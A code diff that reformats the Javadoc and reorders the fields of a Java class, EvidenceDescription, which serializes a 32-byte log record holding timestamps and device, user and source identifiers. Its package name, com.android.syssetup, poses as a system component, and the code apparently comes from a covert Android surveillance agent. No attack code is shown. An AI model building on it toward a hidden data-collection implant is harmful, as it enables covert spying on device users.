@@ -14,41 +14,52 @@ import com.android.syssetup.util.Check;
 import com.android.syssetup.util.DataBuffer;
 
 // TODO: Auto-generated Javadoc
+
 /**
  * The Class EvidenceDescription.
  */
 public class EvidenceDescription {
 
-	/** The version. */
-	public int version;
-
-	/** The log type. */
-	public int logType;
-
-	/** The h time stamp. */
-	public int hTimeStamp;
-
-	/** The l time stamp. */
-	public int lTimeStamp;
-
-	/** The device id len. */
-	public int deviceIdLen;
-
-	/** The user id len. */
-	public int userIdLen;
-
-	/** The source id len. */
-	public int sourceIdLen;
-
-	/** The additional data. */
-	public int additionalData;
-
-	/** The length. */
+	/**
+	 * The length.
+	 */
 	public final int length = 32;
+	/**
+	 * The version.
+	 */
+	public int version;
+	/**
+	 * The log type.
+	 */
+	public int logType;
+	/**
+	 * The h time stamp.
+	 */
+	public int hTimeStamp;
+	/**
+	 * The l time stamp.
+	 */
+	public int lTimeStamp;
+	/**
+	 * The device id len.
+	 */
+	public int deviceIdLen;
+	/**
+	 * The user id len.
+	 */
+	public int userIdLen;
+	/**
+	 * The source id len.
+	 */
+	public int sourceIdLen;
+	/**
+	 * The additional data.
+	 */
+	public int additionalData;
 
 	/**
 	 * Gets the bytes.
-	 * 
+	 *
 	 * @return the bytes
 	 */
 	public byte[] getBytes() {
@@ -62,11 +73,9 @@ public class EvidenceDescription {
 
 	/**
 	 * Serialize.
-	 * 
-	 * @param buffer
-	 *            the buffer
-	 * @param offset
-	 *            the offset
+	 *
+	 * @param buffer the buffer
+	 * @param offset the offset
 	 */
 	public void serialize(final byte[] buffer, final int offset) {
 		final DataBuffer databuffer = new DataBuffer(buffer, offset, length);
